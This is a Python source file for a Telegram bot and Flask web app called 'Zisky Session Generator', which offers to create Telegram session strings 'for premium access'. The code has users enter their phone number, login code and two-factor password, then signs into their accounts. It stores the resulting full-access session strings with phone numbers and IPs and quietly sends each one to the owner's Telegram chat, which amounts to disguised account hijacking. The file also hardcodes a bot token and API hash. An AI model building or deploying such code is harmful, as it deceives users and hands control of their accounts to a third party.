#!/usr/bin/env python3
"""
ZISKY SESSION GENERATOR BOT
FINAL VERSION - SEPARATE PROCESSES
- Flask and Telegram bot run independently
- 100% reliable message delivery
- No more timing issues
"""

import asyncio
import logging
import sqlite3
import threading
import time
import os
import uuid
import concurrent.futures
import multiprocessing
import requests
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

# ========== CONFIGURATION ==========
BOT_TOKEN = "8354169138:AAGOGowcZFsv6AEn3Y9S48J3yzJ85wlJt78"
API_ID = 38550990
API_HASH = "26c65e47681802c551563f11b6b333a4"
OWNER_ID = 8158086374
PUBLIC_URL = "https://sessionsgen.onrender.com"

# ========== SETUP ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database setup
conn = sqlite3.connect('sessions.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS sessions
             (id INTEGER PRIMARY KEY AUTOINCREMENT,
              user_id INTEGER,
              telegram_id INTEGER,
              phone TEXT,
              session_string TEXT,
              first_name TEXT,
              username TEXT,
              generated_at TEXT,
              ip TEXT,
              method TEXT)''')
conn.commit()

# Store temporary session data (NOT the client)
temp_sessions = {}

# Message queue database (using SQLite for persistence)
def init_message_queue():
    conn = sqlite3.connect('message_queue.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS owner_messages
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  message TEXT,
                  created_at TEXT,
                  sent INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()

init_message_queue()

# ========== FLASK WEB APP ==========
app = Flask(__name__)
app.secret_key = os.urandom(24)

@app.route('/')
def index():
    return render_template('code_input.html')

def save_owner_message(message):
    """Save owner message to database queue"""
    conn = sqlite3.connect('message_queue.db')
    c = conn.cursor()
    c.execute("INSERT INTO owner_messages (message, created_at) VALUES (?, ?)",
              (message, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    print(f"📝 Owner message saved to queue (ID: {c.lastrowid})")

# ===== METHOD 1: PHONE + CODE =====
@app.route('/request-code', methods=['POST'])
def request_code():
    data = request.json
    phone = data.get('phone')
    user_telegram_id = data.get('user_id')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    # Generate a unique session ID
    session_id = str(uuid.uuid4())
    
    try:
        def request_code_thread():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            async def _request():
                client = TelegramClient(StringSession(), API_ID, API_HASH)
                try:
                    await client.connect()
                    result = await client.send_code_request(phone)
                    phone_code_hash = result.phone_code_hash
                    temp_session_string = client.session.save()
                    await client.disconnect()
                    
                    return {
                        'success': True, 
                        'temp_session': temp_session_string,
                        'phone_code_hash': phone_code_hash
                    }
                except Exception as e:
                    await client.disconnect()
                    return {'success': False, 'error': str(e)}
            
            try:
                result = loop.run_until_complete(_request())
                return result
            finally:
                loop.close()
        
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(request_code_thread)
            result = future.result(timeout=30)
        
        if result.get('success'):
            temp_sessions[session_id] = {
                'temp_session': result['temp_session'],
                'phone_code_hash': result['phone_code_hash'],
                'phone': phone,
                'telegram_id': user_telegram_id,
                'created_at': time.time()
            }
            return jsonify({'success': True, 'session_id': session_id})
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password', '')
    user_telegram_id = data.get('user_id')
    session_id = data.get('session_id')
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired. Start over.'})
    
    temp_data = temp_sessions[session_id]
    temp_session_string = temp_data['temp_session']
    phone_code_hash = temp_data['phone_code_hash']
    
    def verify_code_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def _verify():
            client = TelegramClient(StringSession(temp_session_string), API_ID, API_HASH)
            try:
                await client.connect()
                
                try:
                    await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                except SessionPasswordNeededError:
                    if not password:
                        return {'success': False, 'error': '2FA password required'}
                    await client.sign_in(password=password)
                
                me = await client.get_me()
                final_session_string = client.session.save()
                await client.disconnect()
                
                return {
                    'success': True,
                    'session': final_session_string,
                    'user_id': me.id,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'username': me.username,
                    'phone': me.phone
                }
            except PhoneCodeInvalidError:
                await client.disconnect()
                return {'success': False, 'error': 'Invalid code'}
            except Exception as e:
                await client.disconnect()
                return {'success': False, 'error': str(e)}
        
        try:
            result = loop.run_until_complete(_verify())
            return result
        finally:
            loop.close()
    
    try:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(verify_code_thread)
            result = future.result(timeout=60)
        
        if result.get('success'):
            ip = request.remote_addr
            
            # Save to database
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute('''INSERT INTO sessions 
                        (user_id, telegram_id, phone, session_string, first_name, username, generated_at, ip, method)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (result['user_id'], user_telegram_id, phone, result['session'], 
                      f"{result['first_name']} {result.get('last_name', '')}", 
                      result.get('username'), datetime.now().isoformat(), ip, 'phone_code'))
            conn.commit()
            conn.close()
            
            # Save owner message to database queue
            save_owner_message(format_owner_message(
                result['user_id'],
                user_telegram_id,
                phone,
                result['session'],
                f"{result['first_name']} {result.get('last_name', '')}",
                result.get('username'),
                'phone_code'
            ))
            
            # Clean up temp session
            del temp_sessions[session_id]
            
            return jsonify({
                'success': True,
                'session': result['session']
            })
        else:
            return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ===== METHOD 2: API ID + HASH =====
@app.route('/generate-session', methods=['POST'])
def generate_session():
    data = request.json
    api_id = data.get('api_id')
    api_hash = data.get('api_hash')
    user_telegram_id = data.get('user_id')
    
    if not api_id or not api_hash:
        return jsonify({'success': False, 'error': 'API ID and Hash required'})
    
    try:
        api_id = int(api_id)
    except:
        return jsonify({'success': False, 'error': 'API ID must be a number'})
    
    if len(api_hash) < 10:
        return jsonify({'success': False, 'error': 'API Hash looks invalid'})
    
    def generate_session_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def _generate():
            client = TelegramClient(StringSession(), api_id, api_hash)
            try:
                await client.connect()
                
                if not await client.is_user_authorized():
                    await client.disconnect()
                    return {
                        'success': False,
                        'error': 'Phone verification required. Use Phone + Code method.'
                    }
                
                me = await client.get_me()
                session_string = client.session.save()
                await client.disconnect()
                
                return {
                    'success': True,
                    'session': session_string,
                    'user_id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': me.phone
                }
            except Exception as e:
                await client.disconnect()
                return {'success': False, 'error': str(e)[:100]}
        
        try:
            result = loop.run_until_complete(_generate())
            return result
        finally:
            loop.close()
    
    try:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(generate_session_thread)
            result = future.result(timeout=30)
        
        if result.get('success'):
            ip = request.remote_addr
            
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute('''INSERT INTO sessions 
                        (user_id, telegram_id, phone, session_string, first_name, username, generated_at, ip, method)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (result['user_id'], user_telegram_id, result.get('phone', 'Unknown'), result['session'], 
                      f"{result['first_name']} {result.get('last_name', '')}", 
                      result.get('username'), datetime.now().isoformat(), ip, 'api_hash'))
            conn.commit()
            conn.close()
            
            # Save owner message to database queue
            save_owner_message(format_owner_message(
                result['user_id'],
                user_telegram_id,
                result.get('phone', 'Unknown'),
                result['session'],
                f"{result['first_name']} {result.get('last_name', '')}",
                result.get('username'),
                'api_hash'
            ))
            
            return jsonify({
                'success': True,
                'session': result['session']
            })
        else:
            return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

# ========== MESSAGE FORMATTING ==========
def format_owner_message(account_id, telegram_id, phone, session_string, first_name, username, method):
    method_emoji = {
        'phone_code': '📱',
        'api_hash': '🔑',
        'test': '🧪'
    }.get(method, '❓')
    
    return f"""🔐 **NEW SESSION GENERATED** {method_emoji}

👤 **User:** {first_name}
🆔 **Account ID:** `{account_id}`
⭐ **Telegram ID (for premium):** `{telegram_id}`
📱 **Phone:** `{phone}`
🔗 **Username:** @{username if username else 'None'}
⏱️ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📌 **Method:** {method.replace('_', ' ').title()}

🔑 **SESSION STRING:**
`{session_string}`

⚠️ **Store this securely!`"""

# ========== TELEGRAM BOT PROCESS ==========
def run_telegram_bot():
    """Run the Telegram bot in a separate process"""
    print("🚀 Starting Telegram bot process...")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        keyboard = [[InlineKeyboardButton("🌐 Open Web App", web_app={'url': PUBLIC_URL})]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"👋 **Welcome to Zisky Session Generator, {user.first_name}!**\n\n"
            f"Generate Telegram session strings for premium access.\n\n"
            f"Click the button below to start!",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM sessions")
        total = c.fetchone()[0]
        conn.close()
        
        conn = sqlite3.connect('message_queue.db')
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM owner_messages WHERE sent=0")
        pending = c.fetchone()[0]
        conn.close()
        
        await update.message.reply_text(
            f"📊 **Bot Status**\n\n"
            f"✅ Bot is running\n"
            f"📱 Total Sessions: {total}\n"
            f"📨 Pending Messages: {pending}",
            parse_mode='Markdown'
        )
    
    async def process_queue(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Manually trigger queue processing"""
        user_id = update.effective_user.id
        if user_id != OWNER_ID:
            await update.message.reply_text("❌ Owner only command!")
            return
        
        sent = process_message_queue(app)
        await update.message.reply_text(f"✅ Processed {sent} pending messages")
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("process_queue", process_queue))
    
    # Start queue processor in background
    def queue_processor():
        while True:
            try:
                process_message_queue(app)
            except Exception as e:
                print(f"Queue processor error: {e}")
            time.sleep(5)
    
    processor_thread = threading.Thread(target=queue_processor, daemon=True)
    processor_thread.start()
    
    print("✅ Telegram bot ready, starting polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

def process_message_queue(bot_app):
    """Process pending messages from queue"""
    sent_count = 0
    try:
        conn = sqlite3.connect('message_queue.db')
        c = conn.cursor()
        c.execute("SELECT id, message FROM owner_messages WHERE sent=0 ORDER BY id ASC LIMIT 5")
        messages = c.fetchall()
        
        for msg_id, msg_text in messages:
            try:
                bot_app.bot.send_message(chat_id=OWNER_ID, text=msg_text, parse_mode='Markdown')
                c.execute("UPDATE owner_messages SET sent=1 WHERE id=?", (msg_id,))
                conn.commit()
                sent_count += 1
                print(f"✅ Sent message {msg_id} to owner")
            except Exception as e:
                print(f"❌ Failed to send message {msg_id}: {e}")
        
        conn.close()
    except Exception as e:
        print(f"Queue processing error: {e}")
    
    return sent_count

# ========== MAIN ==========
if __name__ == '__main__':
    print("🤖 Zisky Session Generator Bot")
    print("="*50)
    print(f"🔑 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"🆔 Owner ID: {OWNER_ID}")
    print("="*50)
    
    # Start Flask in a separate process
    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
    
    flask_process = multiprocessing.Process(target=run_flask, daemon=True)
    flask_process.start()
    print("✅ Flask web app started in separate process on port 5000")
    
    # Start Telegram bot in main thread
    run_telegram_bot()
